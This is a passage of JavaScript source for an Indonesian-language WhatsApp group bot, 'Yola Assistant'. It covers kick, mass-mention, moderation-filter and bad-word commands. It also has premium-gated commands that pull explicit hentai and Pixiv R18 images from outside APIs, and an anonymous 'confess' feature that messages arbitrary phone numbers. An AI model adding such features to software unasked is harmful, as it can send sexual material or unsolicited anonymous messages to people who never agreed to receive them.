                if (!m.isGroup) return reply('────୨ Yola Assistant ৎ────\n❌ Perintah ini cuma buat di grup aja, Kak~\n────୨ Yola Assistant ৎ────');
                if (!m.isAdmin && !isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Owner Yola yang boleh.\n────୨ Yola Assistant ৎ────');
                if (!m.isBotAdmin) return reply('────୨ Yola Assistant ৎ────\n🤖 Aduh, Yola bukan Admin di sini... Jadi gak bisa nendang orang.\n────୨ Yola Assistant ৎ────');
                let usersToKick = m.mentionedJid;
                if (!usersToKick || usersToKick.length === 0) {
                    if (m.quoted) {
                        usersToKick = [m.quoted.sender];
                    } else {
                        const numberInput = text.replace(/[^0-9]/g, '');
                        if (numberInput) {
                            const potentialJid = `${numberInput}@s.whatsapp.net`;
                            if (participants.some(p => p.id === potentialJid)) {
                                usersToKick = [potentialJid];
                            }
                        }
                    }
                }
                if (!usersToKick || usersToKick.length === 0) return reply('────୨ Yola Assistant ৎ────\n❓ Siapa yang mau ditendang nih? Tag orangnya, reply pesannya, atau ketik nomornya yaa~\n────୨ Yola Assistant ৎ────');
                let kickedCount = 0;
                let failedKicks = [];
                for (const user of usersToKick) {
                    if (user === botNumber) {
                        failedKicks.push(`@${user.split('@')[0]} (Yola gak bisa nendang diri sendiri dong! >.<)`);
                        continue;
                    }
                    if (user === m.sender) {
                        failedKicks.push(`@${user.split('@')[0]} (Masa mau nendang diri sendiri, Kak? Ehehe)`);
                        continue;
                    }
                    const targetIsDev = global.owner.map((v) => v.replace(/[^0-9]/g, "") + "@s.whatsapp.net").includes(user);
                    const targetIsOwnerR = OwnerR.includes(user);
                    if (targetIsDev || targetIsOwnerR) {
                        failedKicks.push(`@${user.split('@')[0]} (Hmph! Gak boleh nendang Owner Yola!)`);
                        continue;
                    }
                    const targetAdmin = participants.find(p => p.id === user)?.admin;
                    if (targetAdmin === 'admin' || targetAdmin === 'superadmin') {
                        failedKicks.push(`@${user.split('@')[0]} (Dia Admin juga, Yola gak bisa nendang...)`);
                        continue;
                    }
                    try {
                        await yola.groupParticipantsUpdate(m.chat, [user], "remove");
                        kickedCount++;
                        await sleep(500);
                    } catch (e) {
                        failedKicks.push(`@${user.split('@')[0]} (Gagal ditendang, mungkin ada error)`);
                        await sleep(300);
                    }
                }
                let replyMsg = '';
                if (kickedCount > 0) replyMsg += `✅ Berhasil nendang *${kickedCount}* orang keluar. Bye bye~ 👋\n`;
                if (failedKicks.length > 0) replyMsg += `❌ Ada yang gagal ditendang nih: ${failedKicks.join(', ')}.`;
                if (replyMsg) reply(`────୨ Yola Assistant ৎ────\n${replyMsg.trim()}\n────୨ Yola Assistant ৎ────`, {
                    mentions: [...usersToKick, ...failedKicks.map(u => u.split(' ')[0].replace('@', '') + '@s.whatsapp.net')]
                });
                else reply("────୨ Yola Assistant ৎ────\nℹ️ Hmmm, Yola gak nemu target yang valid buat ditendang.\n────୨ Yola Assistant ৎ────");
            }
            break;
            case 'hidetag':
            case 'h': {
                if (!m.isGroup) return reply('────୨ Yola Assistant ৎ────\n❌ Perintah ini cuma buat di grup aja, Kak~\n────୨ Yola Assistant ৎ────');
                if (!m.isAdmin && !m.isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Admin atau Owner Yola yang boleh.\n────୨ Yola Assistant ৎ────');
                const messageText = text || (m.quoted ? m.quoted.text : '');
                if (!messageText) return reply('────୨ Yola Assistant ৎ────\n❓ Mau Yola bilang apa nih di hidetag? Ketik pesannya atau reply yaa~\n────୨ Yola Assistant ৎ────');
                const participantIds = participants.map(p => p.id);
                await yola.sendMessage(m.chat, {
                    text: messageText,
                    mentions: participantIds,
                    contextInfo: {
                        ...defaultContextInfoBuilder(pushname, command),
                        mentionedJid: participantIds
                    }
                }, {
                    quoted: nullgb
                });
            }
            break;

            case 'antivirtex':
            case 'antiwame':
            case 'antiasing':
            case 'antitoxic':
            case 'antilinkall':
            case 'antilinkgc': {
                if (!m.isGroup) return reply('────୨ Yola Assistant ৎ────\n❌ Perintah ini cuma buat di grup aja, Kak~\n────୨ Yola Assistant ৎ────');
                if (!m.isAdmin && !isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Admin atau Owner Yola yang boleh atur ini.\n────୨ Yola Assistant ৎ────');
                const featureMap = {
                    antivirtex: {
                        list: ntvirtex,
                        save: saveAntiVirtex,
                        name: "Anti Virtex"
                    },
                    antiwame: {
                        list: ntwame,
                        save: saveAntiWame,
                        name: "Anti Link WA.me"
                    },
                    antiasing: {
                        list: ntasing,
                        save: saveAntiAsing,
                        name: "Anti Nomor Asing"
                    },
                    antitoxic: {
                        list: nttoxic,
                        save: saveAntiToxic,
                        name: "Anti Toxic"
                    },
                    antilinkall: {
                        list: ntilinkall,
                        save: saveAntiLinkAll,
                        name: "Anti Semua Link"
                    },
                    antilinkgc: {
                        list: ntilinkgc,
                        save: saveAntiLinkGc,
                        name: "Anti Link Grup Lain"
                    },
                };
                const featureData = featureMap[command];
                if (!featureData) return;
                const action = args[0]?.toLowerCase();
                const groupId = m.chat;
                if (action === 'on') {
                    if (featureData.list.includes(groupId)) return reply(`────୨ Yola Assistant ৎ────\n✅ Fitur *${featureData.name}* udah aktif kok di grup ini, Kak~\n────୨ Yola Assistant ৎ────`);
                    featureData.list.push(groupId);
                    featureData.save();
                    reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Fitur *${featureData.name}* udah Yola aktifin buat grup ini! 😉\n────୨ Yola Assistant ৎ────`);
                    if (['antilinkall', 'antitoxic', 'antiwame'].includes(command)) {
                         var groupe = await yola.groupMetadata(m.chat);
                        var members = groupe["participants"];
                        var mems = members.map((adm) => adm.id);
                        let warningText = `────୨ Yola Assistant ৎ────\n\`\`\`Peringatan dari Yola! 📢\`\`\`\nFitur *${featureData.name}* baru aja diaktifin sama Admin. Jadi, patuhi aturannya yaa, teman-teman! >.<\n────୨ Yola Assistant ৎ────`;
                        yola.sendMessage(m.chat, {
                            text: warningText,
                            contextInfo: {
                                mentionedJid: mems,
                                externalAdReply: defaultContextInfoBuilder(pushname, command).externalAdReply
                            }
                        }, {
                            quoted: qchannel
                        });
                    }
                } else if (action === 'off') {
                    const index = featureData.list.indexOf(groupId);
                    if (index === -1) return reply(`────୨ Yola Assistant ৎ────\n🔕 Fitur *${featureData.name}* emang udah nonaktif kok di grup ini, Kak~\n────୨ Yola Assistant ৎ────`);
                    featureData.list.splice(index, 1);
                    featureData.save();
                    reply(`────୨ Yola Assistant ৎ────\n❌ Oke! Fitur *${featureData.name}* udah Yola nonaktifin buat grup ini.\n────୨ Yola Assistant ৎ────`);
                } else {
                    const status = featureData.list.includes(groupId) ? '🟢 Aktif' : '🔴 Nonaktif';
                    reply(`────୨ Yola Assistant ৎ────\n❓ Mau Yola atur fitur *${featureData.name}* jadi apa nih? Ketik: .${command} [on/off]\nStatus sekarang: ${status}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'addbadword': {
                if (!m.isGroup) return reply('────୨ Yola Assistant ৎ────\n❌ Perintah ini cuma buat di grup aja, Kak~\n────୨ Yola Assistant ৎ────');
                if (!m.isAdmin && !isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Admin atau Owner Yola yang boleh.\n────୨ Yola Assistant ৎ────');
                if (!text) return reply('────୨ Yola Assistant ৎ────\n❓ Kata kasarnya apa nih yang mau ditambahin, Kak?\n────୨ Yola Assistant ৎ────');
                const newBadword = text.trim().toLowerCase();
                if (badwords.includes(newBadword)) return reply(`────୨ Yola Assistant ৎ────\nℹ️ Kata "${newBadword}" udah ada kok di daftar Yola.\n────୨ Yola Assistant ৎ────`);
                badwords.push(newBadword);
                saveBadwords();
                reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Kata "${newBadword}" udah Yola masukin ke daftar kata terlarang.\n────୨ Yola Assistant ৎ────`);
            }
            break;
            case 'delbadword':
            case 'delbadwords': {
                if (!m.isGroup) return reply('────୨ Yola Assistant ৎ────\n❌ Perintah ini cuma buat di grup aja, Kak~\n────୨ Yola Assistant ৎ────');
                if (!m.isAdmin && !isOwner) return reply('────୨ Yola Assistant ৎ────\n🔒 Hmph! Cuma Admin atau Owner Yola yang boleh.\n────୨ Yola Assistant ৎ────');
                if (!text) return reply('────୨ Yola Assistant ৎ────\n❓ Kata kasarnya apa nih yang mau dihapus dari daftar Yola, Kak?\n────୨ Yola Assistant ৎ────');
                const wordToDelete = text.trim().toLowerCase();
                const index = badwords.indexOf(wordToDelete);
                if (index === -1) return reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Kata "${wordToDelete}" gak ada tuh di daftar Yola.\n────୨ Yola Assistant ৎ────`);
                badwords.splice(index, 1);
                saveBadwords();
                reply(`────୨ Yola Assistant ৎ────\n✅ Oke! Kata "${wordToDelete}" udah Yola hapus dari daftar kata terlarang.\n────୨ Yola Assistant ৎ────`);
            }
            break;

          /*  case 'wecchi':
                await handleNsfwSimple(yola, m, '💦 Ecchi Lucu!', 'https://api.nekorinn.my.id/waifuim/ecchi', '➡️ Ecchi Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'whentai':
                await handleNsfwSimple(yola, m, '💦 Hentai Menggoda!', 'https://api.nekorinn.my.id/waifuim/hentai', '➡️ Hentai Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'wmaid':
                await handleNsfwSimple(yola, m, '💦 Maid Manis!', 'https://api.nekorinn.my.id/waifuim/maid', '➡️ Maid Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'woral':
                await handleNsfwSimple(yola, m, '💦 Oral Panas!', 'https://api.nekorinn.my.id/waifuim/oral', '➡️ Oral Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'wass':
                await handleNsfwSimple(yola, m, '💦 Ass Menggairahkan!', 'https://api.nekorinn.my.id/waifuim/ass', '➡️ Ass Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'wwaifu':
                await handleNsfwSimple(yola, m, '💦 Waifu Idaman!', 'https://api.nekorinn.my.id/waifuim/waifu', '➡️ Waifu Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'wmilf':
                await handleNsfwSimple(yola, m, '💦 Milf Seksi!', 'https://api.nekorinn.my.id/waifuim/milf', '➡️ Milf Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'hneko':
            case 'hentai-neko':
                await handleNsfwSimple(yola, m, '💦 Neko Nakal!', 'https://waifu.pics/api/nsfw/neko', '➡️ Neko Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'nwaifu':
            case 'hentai-waifu':
                await handleNsfwSimple(yola, m, '💦 Waifu Menggoda!', 'https://waifu.pics/api/nsfw/waifu', '➡️ Waifu Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'trap':
                await handleNsfwSimple(yola, m, '💦 Trap Imut!', 'https://waifu.pics/api/nsfw/trap', '➡️ Trap Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'gasm':
                await handleNsfwSimple(yola, m, '💦 Ekspresi Nikmat!', 'https://nekos.life/api/v2/img/gasm', '➡️ Gasm Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'milf':
                await handleNsfwSimple(yola, m, '💦 Milf Hot!', 'https://waifu.pics/api/nsfw/milf', '➡️ Milf Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'hentai-random': {
                if (!isPremium) return reply(`────୨ Yola Assistant ৎ────\n🔒 Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────`);
                reply("────୨ Yola Assistant ৎ────\nOke! Yola cariin Hentai GIF yang seru yaa... Sebentar!\n────୨ Yola Assistant ৎ────");
                const apiUrl = `https://api.itsrose.life/nsfw/randomHentaiGif`;
                try {
                    const response = await axios.get(apiUrl, {
                        headers: {
                            Authorization: `${global.rosekey}`
                        },
                        responseType: "arraybuffer"
                    });
                    if (!response.data) throw new Error("No data");
                    yola.sendMessage(m.chat, {
                        video: Buffer.from(response.data),
                        gifPlayback: true,
                        caption: "────୨ Yola Assistant ৎ────\n💦 Ini dia Hentai Gif-nya! Semoga suka yaa~ >_<\n────୨ Yola Assistant ৎ────",
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    }, {
                        quoted: qkontak
                    });
                } catch (err) {
                    try {
                        let fallback = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
                        if (!fallback.data?.url) throw new Error("Fallback URL error");
                        yola.sendMessage(m.chat, {
                            caption: "────୨ Yola Assistant ৎ────\nAduh, Yola gagal dapetin GIF-nya... Ini Waifu aja ya sebagai gantinya~ \n────୨ Yola Assistant ৎ────",
                            image: {
                                url: fallback.data.url
                            },
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        }, {
                            quoted: m
                        });
                    } catch {
                        reply("────୨ Yola Assistant ৎ────\nHmph! Gagal total nih, Kak...\n────୨ Yola Assistant ৎ────");
                    }
                }
            }
            break;
            case 'pixivh': {
                const PIXIVH_API_URL = "https://api.nekorinn.my.id/nsfw/pixivr18";
                if (!isPremium) return reply(`────୨ Yola Assistant ৎ────\n🔒 Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────`);
                const pixivQuery = text || "random";
                reply(`────୨ Yola Assistant ৎ────\n🔞 Oke! Yola cariin Pixiv R18 buat: *${pixivQuery}*... Sebentar yaa, Kak!\n────୨ Yola Assistant ৎ────`);
                try {
                    const response = await axios.get(PIXIVH_API_URL, {
                        params: {
                            q: pixivQuery
                        }
                    });
                    if (response.data?.status === true && response.data.result?.length > 0) {
                        const randomPin = pickRandom(response.data.result);
                        const captionText = `────୨ Yola Assistant ৎ────\n🎨 *${randomPin.caption || 'Pixiv R18'}*\n🖌️ Author: ${randomPin.author || '?'}\n🖼️ ID: ${randomPin.id_illust || '?'}\n🔗 URL: ${randomPin.url || '?'}\n🏷️ Tags: ${randomPin.tags || '?'}\n────୨ Yola Assistant ৎ────`;
                        const buttonId = `pixivh_next_${encodeURIComponent(pixivQuery)}`;

                        let messagePayload = {
                            image: {
                                url: randomPin.imageUrl
                            },
                            caption: captionText,
                            footer: `Yola Asisten by ThanDz`,
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        };

                        if (currentMenuStyle === 'V1') {
                            messagePayload.buttons = [{
                                buttonId: buttonId,
                                buttonText: {
                                    displayText: "➡️ Lagi Dong!"
                                },
                                type: 1
                            }];
                            messagePayload.headerType = 4;
                        } else {
                             messagePayload.caption += `\n\nKetik \`${prefix}pixivh ${pixivQuery}\` untuk gambar berikutnya.`;
                        }

                        await yola.sendMessage(m.chat, messagePayload, {
                            quoted: m
                        });
                    } else {
                        throw new Error("Hmph! Gak ada hasil NSFW yang Yola temuin buat itu...");
                    }
                } catch (error) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal cari di Pixiv R18: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'handle_pixivh_next':
            case 'handle_nsfw_next': {
                const [handlerType, commandBase, ...queryParts] = body.split('_');
                const originalCommand = commandBase;
                const queryEncoded = queryParts.join('_');
                const query = decodeURIComponent(queryEncoded);

                let apiUrl, buttonText, nsfwCommandName;

                if (originalCommand === 'pixivh') {
                    apiUrl = `https://api.nekorinn.my.id/nsfw/pixivr18?q=${encodeURIComponent(query)}`;
                    buttonText = "➡️ Pixiv Lagi!";
                    nsfwCommandName = `Pixiv R18 (${query})`;
                } else {
                    const nsfwMap = {
                        'wecchi': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/ecchi',
                            buttonText: '➡️ Ecchi Lagi!'
                        },
                        'whentai': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/hentai',
                            buttonText: '➡️ Hentai Lagi!'
                        },
                        'wmaid': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/maid',
                            buttonText: '➡️ Maid Lagi!'
                        },
                        'woral': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/oral',
                            buttonText: '➡️ Oral Lagi!'
                        },
                        'wass': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/ass',
                            buttonText: '➡️ Ass Lagi!'
                        },
                        'wwaifu': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/waifu',
                            buttonText: '➡️ Waifu Lagi!'
                        },
                        'wmilf': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/milf',
                            buttonText: '➡️ Milf Lagi!'
                        },
                        'hneko': {
                            apiUrl: 'https://waifu.pics/api/nsfw/neko',
                            buttonText: '➡️ Neko Lagi!'
                        },
                        'nwaifu': {
                            apiUrl: 'https://waifu.pics/api/nsfw/waifu',
                            buttonText: '➡️ Waifu Lagi!'
                        },
                        'trap': {
                            apiUrl: 'https://waifu.pics/api/nsfw/trap',
                            buttonText: '➡️ Trap Lagi!'
                        },
                        'gasm': {
                            apiUrl: 'https://nekos.life/api/v2/img/gasm',
                            buttonText: '➡️ Gasm Lagi!'
                        },
                        'milf': {
                            apiUrl: 'https://waifu.pics/api/nsfw/milf',
                            buttonText: '➡️ Milf Lagi!'
                        }
                    };
                    if (nsfwMap[originalCommand]) {
                        apiUrl = nsfwMap[originalCommand].apiUrl;
                        buttonText = nsfwMap[originalCommand].buttonText;
                        nsfwCommandName = capital(originalCommand);
                    } else {
                        return reply("────୨ Yola Assistant ৎ────\nPerintah NSFW berikutnya tidak dikenal.\n────୨ Yola Assistant ৎ────");
                    }
                }
                await handleNsfwNextButton(yola, m, nsfwCommandName, apiUrl, buttonText, isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, originalCommand));
            }
            break;

            case 'confess': {
                if (!text || !text.includes('.')) return reply(`────୨ Yola Assistant ৎ────\nFormat salah. Contoh: ${prefix}confess 6287729850738.Pesan rahasia ini.Nama Pengirim/sembunyi\n────୨ Yola Assistant ৎ────`);

                const parts = text.split('.');
                if (parts.length < 3) return reply(`────୨ Yola Assistant ৎ────\nFormat salah. Contoh: ${prefix}confess 6287729850738.Pesan rahasia ini.Nama Pengirim/sembunyi\n────୨ Yola Assistant ৎ────`);

                let targetNumber = parts[0].replace(/[^0-9]/g, '');
                if (!targetNumber) return reply(`────୨ Yola Assistant ৎ────\nNomor target tidak valid.\n────୨ Yola Assistant ৎ────`);
                if (targetNumber.startsWith('0')) targetNumber = '62' + targetNumber.substring(1);
                const targetJid = `${targetNumber}@s.whatsapp.net`;
                const confessMessage = parts[1].trim();
                const senderNameOption = parts[2].trim();
                const senderName = senderNameOption.toLowerCase() === 'sembunyi' ? 'Anonim' : senderNameOption;

                if (targetJid === m.sender) return reply(`────୨ Yola Assistant ৎ────\nTidak bisa mengirim confess ke diri sendiri, Kak.\n────୨ Yola Assistant ৎ────`);

                let checkTarget = await yola.onWhatsApp(targetJid);
                if (!checkTarget?.[0]?.exists) return reply(`────୨ Yola Assistant ৎ────\nNomor target tidak terdaftar di WhatsApp.\n────୨ Yola Assistant ৎ────`);

                const confessId = `confess_${m.sender.split('@')[0]}_${targetJid.split('@')[0]}_${Date.now()}`;
                pendingConfesses[confessId] = {
                    sender: m.sender,
                    target: targetJid,
                    message: confessMessage,
                    senderName: senderName,
                    timestamp: Date.now()
                };
                savePendingConfesses();

                let confessText = `────୨ Yola Assistant ৎ────\n💌 *Pesan Confess dari ${senderName}!* 💌\n\n"${confessMessage}"\n\n*Balas confess ini dengan me-reply pesan ini!*\n────୨ Yola Assistant ৎ────`;

                const confessMsg = await yola.sendMessage(targetJid, {
                    text: confessText,
                    contextInfo: defaultContextInfoBuilder(pushname, command)
                });
                await yola.sendMessage(confessMsg.key.remoteJid, { react: { text: "💌", key: confessMsg.key }});

                pendingConfesses[confessId].botMessageKey = confessMsg.key;
                savePendingConfesses();

                reply(`────୨ Yola Assistant ৎ────\n✅ Confess berhasil dikirim ke ${targetNumber}! Semoga dia tahu perasaan Kakak ya! >_<\n────୨ Yola Assistant ৎ────`);
            }
            break;

            case 'handle_confess_reply': {
                if (!m.quoted || !m.quoted.fromMe || !m.quoted.id) return; // Not a reply to bot's message or not from bot

                const originalMessageText = m.quoted.text;
                const matchConfess = originalMessageText.match(/confess_([0-9]+)_([0-9]+)_([0-9]+)/);

                if (!matchConfess) { // Try to find by content if no specific ID match
                     const targetConfess = Object.values(pendingConfesses).find(confess => 
                        confess.botMessageKey && 
                        confess.botMessageKey.id === m.quoted.id &&
                        confess.botMessageKey.remoteJid === m.quoted.chat
                     );
                     if (targetConfess) {
                         const replyMessage = text;
                         const senderOfReply = m.sender; // The one replying to the confess
                         const originalSender = targetConfess.sender; // The one who sent the original confess
                         const originalSenderName = registeredUsers[originalSender]?.name || originalSender.split('@')[0];
                         const targetReceiver = targetConfess.target; // The original recipient of the confess (who is now replying)
                         const targetReceiverName = registeredUsers[targetReceiver]?.name || targetReceiver.split('@')[0];
                         const originalConfessMessage = targetConfess.message;

                         if (senderOfReply !== targetReceiver) {
                             return reply(`────୨ Yola Assistant ৎ────\nIni bukan pesan confess yang ditujukan kepada Kakak, jadi Kakak tidak bisa membalasnya.\n────୨ Yola Assistant ৎ────`);
                         }

                         const replyNotificationToOriginalSender = `────୨ Yola Assistant ৎ────\n🔔 *Balasan untuk Confess Kakak!* 🔔\n\nConfess Kakak: "${originalConfessMessage}"\n\nDari ${targetReceiverName} (Penerima): "${replyMessage}"\n\nSemoga ini kabar baik yaa! ✨\n────୨ Yola Assistant ৎ────`;
                         await yola.sendMessage(originalSender, {
                             text: replyNotificationToOriginalSender,
                             contextInfo: defaultContextInfoBuilder(pushname, command)
                         });

                         reply(`────୨ Yola Assistant ৎ────\n✅ Balasan Kakak sudah Yola kirimkan kepada pengirim confess!\n────୨ Yola Assistant ৎ────`);
                         delete pendingConfesses[targetConfess.confessId]; // Remove from pending after reply
                         savePendingConfesses();
                         return;
                     }
                }
            }
            break;

            case 'wecchi':
                await handleNsfwSimple(yola, m, '💦 Ecchi Lucu!', 'https://api.nekorinn.my.id/waifuim/ecchi', '➡️ Ecchi Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'whentai':
                await handleNsfwSimple(yola, m, '💦 Hentai Menggoda!', 'https://api.nekorinn.my.id/waifuim/hentai', '➡️ Hentai Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'wmaid':
                await handleNsfwSimple(yola, m, '💦 Maid Manis!', 'https://api.nekorinn.my.id/waifuim/maid', '➡️ Maid Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'woral':
                await handleNsfwSimple(yola, m, '💦 Oral Panas!', 'https://api.nekorinn.my.id/waifuim/oral', '➡️ Oral Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'wass':
                await handleNsfwSimple(yola, m, '💦 Ass Menggairahkan!', 'https://api.nekorinn.my.id/waifuim/ass', '➡️ Ass Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'wwaifu':
                await handleNsfwSimple(yola, m, '💦 Waifu Idaman!', 'https://api.nekorinn.my.id/waifuim/waifu', '➡️ Waifu Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'wmilf':
                await handleNsfwSimple(yola, m, '💦 Milf Seksi!', 'https://api.nekorinn.my.id/waifuim/milf', '➡️ Milf Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'hneko':
            case 'hentai-neko':
                await handleNsfwSimple(yola, m, '💦 Neko Nakal!', 'https://waifu.pics/api/nsfw/neko', '➡️ Neko Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'nwaifu':
            case 'hentai-waifu':
                await handleNsfwSimple(yola, m, '💦 Waifu Menggoda!', 'https://waifu.pics/api/nsfw/waifu', '➡️ Waifu Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'trap':
                await handleNsfwSimple(yola, m, '💦 Trap Imut!', 'https://waifu.pics/api/nsfw/trap', '➡️ Trap Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'gasm':
                await handleNsfwSimple(yola, m, '💦 Ekspresi Nikmat!', 'https://nekos.life/api/v2/img/gasm', '➡️ Gasm Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'milf':
                await handleNsfwSimple(yola, m, '💦 Milf Hot!', 'https://waifu.pics/api/nsfw/milf', '➡️ Milf Lagi Dong!', isOwner, isPremium, reply, defaultContextInfoBuilder(pushname, command));
                break;
            case 'hentai-random': {
                if (!isPremium) return reply(`────୨ Yola Assistant ৎ────\n🔒 Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────`);
                reply("────୨ Yola Assistant ৎ────\nOke! Yola cariin Hentai GIF yang seru yaa... Sebentar!\n────୨ Yola Assistant ৎ────");
                const apiUrl = `https://api.itsrose.life/nsfw/randomHentaiGif`;
                try {
                    const response = await axios.get(apiUrl, {
                        headers: {
                            Authorization: `${global.rosekey}`
                        },
                        responseType: "arraybuffer"
                    });
                    if (!response.data) throw new Error("No data");
                    yola.sendMessage(m.chat, {
                        video: Buffer.from(response.data),
                        gifPlayback: true,
                        caption: "────୨ Yola Assistant ৎ────\n💦 Ini dia Hentai Gif-nya! Semoga suka yaa~ >_<\n────୨ Yola Assistant ৎ────",
                        contextInfo: defaultContextInfoBuilder(pushname, command)
                    }, {
                        quoted: qkontak
                    });
                } catch (err) {
                    try {
                        let fallback = await axios.get(`https://waifu.pics/api/nsfw/waifu`);
                        if (!fallback.data?.url) throw new Error("Fallback URL error");
                        yola.sendMessage(m.chat, {
                            caption: "────୨ Yola Assistant ৎ────\nAduh, Yola gagal dapetin GIF-nya... Ini Waifu aja ya sebagai gantinya~ \n────୨ Yola Assistant ৎ────",
                            image: {
                                url: fallback.data.url
                            },
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        }, {
                            quoted: m
                        });
                    } catch {
                        reply("────୨ Yola Assistant ৎ────\nHmph! Gagal total nih, Kak...\n────୨ Yola Assistant ৎ────");
                    }
                }
            }
            break;
            case 'pixivh': {
                const PIXIVH_API_URL = "https://api.nekorinn.my.id/nsfw/pixivr18";
                if (!isPremium) return reply(`────୨ Yola Assistant ৎ────\n🔒 Fitur ini khusus buat Kakak Premium atau Owner Yola aja~\n────୨ Yola Assistant ৎ────`);
                const pixivQuery = text || "random";
                reply(`────୨ Yola Assistant ৎ────\n🔞 Oke! Yola cariin Pixiv R18 buat: *${pixivQuery}*... Sebentar yaa, Kak!\n────୨ Yola Assistant ৎ────`);
                try {
                    const response = await axios.get(PIXIVH_API_URL, {
                        params: {
                            q: pixivQuery
                        }
                    });
                    if (response.data?.status === true && response.data.result?.length > 0) {
                        const randomPin = pickRandom(response.data.result);
                        const captionText = `────୨ Yola Assistant ৎ────\n🎨 *${randomPin.caption || 'Pixiv R18'}*\n🖌️ Author: ${randomPin.author || '?'}\n🖼️ ID: ${randomPin.id_illust || '?'}\n🔗 URL: ${randomPin.url || '?'}\n🏷️ Tags: ${randomPin.tags || '?'}\n────୨ Yola Assistant ৎ────`;
                        const buttonId = `pixivh_next_${encodeURIComponent(pixivQuery)}`;

                        let messagePayload = {
                            image: {
                                url: randomPin.imageUrl
                            },
                            caption: captionText,
                            footer: `Yola Asisten by ThanDz`,
                            contextInfo: defaultContextInfoBuilder(pushname, command)
                        };

                        if (currentMenuStyle === 'V1') {
                            messagePayload.buttons = [{
                                buttonId: buttonId,
                                buttonText: {
                                    displayText: "➡️ Lagi Dong!"
                                },
                                type: 1
                            }];
                            messagePayload.headerType = 4;
                        } else {
                             messagePayload.caption += `\n\nKetik \`${prefix}pixivh ${pixivQuery}\` untuk gambar berikutnya.`;
                        }

                        await yola.sendMessage(m.chat, messagePayload, {
                            quoted: m
                        });
                    } else {
                        throw new Error("Hmph! Gak ada hasil NSFW yang Yola temuin buat itu...");
                    }
                } catch (error) {
                    await reply(`────୨ Yola Assistant ৎ────\n❌ Hmph! Gagal cari di Pixiv R18: ${error.message}\n────୨ Yola Assistant ৎ────`);
                }
            }
            break;
            case 'handle_pixivh_next':
            case 'handle_nsfw_next': {
                const [handlerType, commandBase, ...queryParts] = body.split('_');
                const originalCommand = commandBase;
                const queryEncoded = queryParts.join('_');
                const query = decodeURIComponent(queryEncoded);

                let apiUrl, buttonText, nsfwCommandName;

                if (originalCommand === 'pixivh') {
                    apiUrl = `https://api.nekorinn.my.id/nsfw/pixivr18?q=${encodeURIComponent(query)}`;
                    buttonText = "➡️ Pixiv Lagi!";
                    nsfwCommandName = `Pixiv R18 (${query})`;
                } else {
                    const nsfwMap = {
                        'wecchi': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/ecchi',
                            buttonText: '➡️ Ecchi Lagi!'
                        },
                        'whentai': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/hentai',
                            buttonText: '➡️ Hentai Lagi!'
                        },
                        'wmaid': {
                            apiUrl: 'https://api.nekorinn.my.id/waifuim/maid',
                            buttonText: '➡️ Maid Lagi!'
                        },
                        'woral': {
